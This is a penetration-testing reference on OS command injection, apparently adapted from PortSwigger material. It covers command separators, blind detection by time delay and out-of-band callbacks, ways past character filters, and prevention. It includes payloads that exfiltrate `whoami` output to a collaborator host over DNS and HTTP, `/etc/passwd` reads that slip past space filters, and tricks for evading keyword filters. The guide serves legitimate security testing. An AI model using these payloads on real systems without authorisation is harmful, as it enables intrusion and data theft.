# OS Command Injection — Reference

Comprehensive reference for detecting and proving OS command injection.
Source: https://portswigger.net/web-security/os-command-injection

OS command injection (a.k.a. shell injection) lets an attacker execute OS
commands on the server running the application, typically leading to full
compromise of the application, its data, and often the host. The web app
passes attacker-controlled input into a shell command without safe handling.

> Safety doctrine: only ever run HARMLESS verification commands (`id`,
> `whoami`, `uname -a`, `ver`, a DNS/HTTP callback, or `sleep`/`ping` for
> timing). Never run destructive, data-modifying, or persistence payloads.
> Stop at the minimum proof of execution.

## Useful verification commands (harmless only)

| Purpose            | Linux / Unix   | Windows        |
|--------------------|----------------|----------------|
| Current user       | `whoami`       | `whoami`       |
| User / privs (id)  | `id`           | `whoami /priv` |
| OS / kernel info   | `uname -a`     | `ver`          |
| Network config     | `ifconfig`     | `ipconfig /all`|
| Network connections| `netstat -an`  | `netstat -an`  |
| Running processes  | `ps -ef`       | `tasklist`     |
| Hostname           | `hostname`     | `hostname`     |
| Time delay (blind) | `sleep 10`     | `timeout 10`   |
| Time delay (ping)  | `ping -c 10 127.0.0.1` | `ping -n 10 127.0.0.1` |

Use the smallest command that proves execution. `id` / `whoami` is usually
enough; do not enumerate further than needed for the report.

## Command separators

Chaining metacharacters let you append your command to the intended one.

| Separator        | Unix | Windows | Notes |
|------------------|:----:|:-------:|-------|
| `&`              |  ✓   |   ✓     | Run both; async on Unix |
| `&&`             |  ✓   |   ✓     | Run second only if first succeeds |
| `\|`             |  ✓   |   ✓     | Pipe stdout of first to second |
| `\|\|`           |  ✓   |   ✓     | Run second only if first fails |
| `;`              |  ✓   |         | Sequential; Unix only |
| `0x0a` / `\n`    |  ✓   |         | Newline separator; URL-encode as `%0a` |
| `` `cmd` ``      |  ✓   |         | Backtick command substitution |
| `$(cmd)`         |  ✓   |         | `$()` command substitution |

When your input lands in the middle of a command, wrap the payload with
separators on both sides, e.g. `& injected &` or `127.0.0.1; id ;`.

## Ways to inject commands

1. Append after a value that already works (valid IP/host/filename), using a
   separator from the table above.
2. Inline substitution: replace or embed a token with `$(...)` or backticks,
   e.g. `file_$(whoami).png`, `host=`id``.
3. Argument injection: smuggle extra flags into a tool when full shell
   injection is blocked (e.g. an option that writes a file or makes a request).
4. Newline injection in multi-line / config-style inputs (`%0a`).

## Blind detection (no reflected output)

Many injection points return nothing useful. Confirm execution indirectly.

### 1. Time delays
Inject a command that pauses, then measure response time.
```
& ping -c 10 127.0.0.1 &      # Unix, ~10s delay
& ping -n 10 127.0.0.1 &      # Windows
; sleep 10 ;                  # Unix
```
Confirm by varying the delay (e.g. 5s vs 15s) and seeing response time track it.

### 2. Out-of-band (OAST) — DNS + HTTP (preferred)
Trigger a network callback to a collaborator host you control. A received
lookup/request proves execution even when output is suppressed and bypasses
output-based filtering.
```
& nslookup x.<id>.oast.example &
& curl http://<id>.oast.example/ &
```
Exfiltrate small data into the DNS subdomain:
```
& nslookup `whoami`.<id>.oast.example &
& nslookup $(whoami).<id>.oast.example &
```
The collaborator log then shows e.g. `www-data.<id>.oast.example`.

### 3. Output redirection to web root
Write harmless output to a file under a web-served directory, then fetch it.
```
& whoami > /var/www/static/o.txt &
```
Then GET `https://TARGET/o.txt` to read the result.

## Injecting when characters are filtered

### Spaces blocked
```
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}          # brace expansion, comma-separated args
cat</etc/passwd            # input redirection avoids a space
X=$'\x20';cat${X}/etc/passwd
```
`$IFS` is the shell's Internal Field Separator (whitespace by default).
`$IFS$9` works because `$9` expands to empty, terminating the variable name.

### Other character filters
- Newline as separator: `%0a` (URL-encoded) often slips past `;`/`&` filters.
- Quotes / backslashes inside tokens to break keyword matching:
  `w'h'oami`, `who\ami`, `"who"ami`.
- Encoded/concatenated commands via shell features (e.g. base64 piped to a
  decoder) when literal keywords are blocked.
- WAF/keyword filters: prefer OAST so the result never has to pass back
  through the filtered response channel.

## Prevention (for triage notes / reports)

Per PortSwigger, the most effective defense is to **never call out to OS
commands from application-layer code**. If unavoidable:
- Validate against a strict allowlist of permitted values.
- Validate numeric-only / alphanumeric-only input where applicable.
- Use APIs/libraries instead of shelling out; avoid passing input to a shell.
- **Do not** rely on escaping shell metacharacters — it is error-prone and
  reliably bypassable.

## References
- https://portswigger.net/web-security/os-command-injection
